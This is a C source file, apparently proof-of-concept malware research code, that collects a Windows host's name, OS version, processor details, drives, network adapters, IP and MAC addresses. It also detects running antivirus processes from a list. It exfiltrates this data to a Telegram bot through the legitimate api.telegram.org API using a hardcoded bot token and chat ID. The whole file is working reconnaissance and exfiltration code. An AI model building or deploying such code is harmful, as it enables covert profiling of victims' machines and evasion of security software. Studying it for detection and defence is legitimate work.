/*
 * hack.c
 * sending systeminfo via legit URL. Telegram API
 * author @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <iphlpapi.h>

// define a struct to store process name and description
typedef struct {
  char process_name[256];
  char description[256];
} Process;

// array of Process structs, and counter
Process* process_list;
int process_count = 0;

// send data to Telegram channel using winhttp
int sendToTgBot(const char* message) {
  const char* chatId = "5547299598";
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;

  hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (hSession == NULL) {
    fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
    return 1;
  }

  hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (hConnect == NULL) {
    fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hSession);
  }

  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (hRequest == NULL) {
    fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
  }

  // construct the request body
  char requestBody[512];
  sprintf(requestBody, "chat_id=%s&text=%s", chatId, message);

  // set the headers
  if (!WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n", -1, requestBody, strlen(requestBody), strlen(requestBody), 0)) {
    fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hSession);

  printf("successfully sent to tg bot :)\n");
  return 0;
}

// read process data from a file
void readProcListFromFile(const char* filename) {
  FILE* file = fopen(filename, "r");
  if (file == NULL) {
    printf("Could not open file %s", filename);
    return;
  }

  char line[512];
  while (fgets(line, sizeof(line), file)) {
    // reallocate memory for each new process
    process_list = (Process*)realloc(process_list, (process_count + 1) * sizeof(Process));
    // parse the line, split it into process name and description
    char* token = strtok(line, "|");
    strcpy(process_list[process_count].process_name, token);
    token = strtok(NULL, "|");
    strcpy(process_list[process_count].description, token);
    process_count++;
  }

  fclose(file);
}

// enumerate running processes
void enumProcs() {
  HANDLE hProcessSnap;
  PROCESSENTRY32 pe32;
  char avInfo[4096] = "";

  hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hProcessSnap == INVALID_HANDLE_VALUE) {
    printf("CreateToolhelp32Snapshot failed.\n");
    return;
  }

  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (!Process32First(hProcessSnap, &pe32)) {
    printf("Process32First failed.\n");
    CloseHandle(hProcessSnap);
    return;
  }

  do {
    for (int i = 0; i < process_count; i++) {
      if (_stricmp(process_list[i].process_name, pe32.szExeFile) == 0) {
        printf("found process: %s - %s \n", process_list[i].process_name, process_list[i].description);
        snprintf(avInfo, sizeof(avInfo),
        "ProcessName: %s, "
        "AVName: %s",
        process_list[i].process_name,
        process_list[i].description);
        char info[8196];
        // snprintf(info, sizeof(info), "{\"text\":\"%s\"}", avInfo);
        snprintf(info, sizeof(info), "%s", avInfo);
        int result = sendToTgBot(info);
        
        if (result == 0) {
            printf("AV info ok =^..^=\n");
        } else {
            printf("AV info nok <3()~\n");
        }
      }
    }
  } while (Process32Next(hProcessSnap, &pe32));

  CloseHandle(hProcessSnap);
}

// get systeminfo and send as comment via VT API logic
int main(int argc, char* argv[]) {

  // test posting comment
  char test[1024];
  const char* message = "meow-meow";
//   snprintf(test, sizeof(test), "{\"text\":\"%s\"}", message);
  snprintf(test, sizeof(test), "%s", message);
  sendToTgBot(test);

  char systemInfo[4096];

  // Get host name
  CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD size = sizeof(hostName) / sizeof(hostName[0]);
  GetComputerNameA(hostName, &size);  // Use GetComputerNameA for CHAR

  // Get OS version
  OSVERSIONINFO osVersion;
  osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
  GetVersionEx(&osVersion);

  // Get system information
  SYSTEM_INFO sysInfo;
  GetSystemInfo(&sysInfo);

  // Get logical drive information
  DWORD drives = GetLogicalDrives();

  // Get IP address
  IP_ADAPTER_INFO adapterInfo[16];  // Assuming there are no more than 16 adapters
  DWORD adapterInfoSize = sizeof(adapterInfo);
  if (GetAdaptersInfo(adapterInfo, &adapterInfoSize) != ERROR_SUCCESS) {
    printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
    return false;
  }

  snprintf(systemInfo, sizeof(systemInfo),
    "Host Name: %s, "
    "OS Version: %d.%d.%d, "
    "Processor Architecture: %d, "
    "Number of Processors: %d, "
    "Logical Drives: %X, ",
    hostName,
    osVersion.dwMajorVersion, osVersion.dwMinorVersion, osVersion.dwBuildNumber,
    sysInfo.wProcessorArchitecture,
    sysInfo.dwNumberOfProcessors,
    drives);

  // Add IP address information
  for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter->Next) {
    snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
    "Adapter Name: %s, "
    "IP Address: %s, "
    "Subnet Mask: %s, "
    "MAC Address: %02X-%02X-%02X-%02X-%02X-%02X",
    adapter->AdapterName,
    adapter->IpAddressList.IpAddress.String,
    adapter->IpAddressList.IpMask.String,
    adapter->Address[0], adapter->Address[1], adapter->Address[2],
    adapter->Address[3], adapter->Address[4], adapter->Address[5]);
  }

  char info[8196];
//   snprintf(info, sizeof(info), "{\"text\":\"%s\"}", systemInfo);
  snprintf(info, sizeof(info), "%s", systemInfo);
  int result = sendToTgBot(info);

  readProcListFromFile("processes.txt");
  enumProcs();
  // cleanup allocated memory
  if (process_list) {
    free(process_list);
  }

  return 0;
}
